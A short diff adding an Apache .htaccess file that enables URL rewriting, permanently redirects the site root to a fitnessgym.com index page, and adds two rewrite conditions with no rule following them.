@@ -1,0 +1,6 @@
+RewriteEngine On
+
+
+RewriteRule ^$ http://fitnessgym.com/view/index.php [R=301,L]
+RewriteCond %{REQUEST_FILENAME} !^favicon\.ico
+RewriteCond %{SCRIPT_FILENAME} !-f
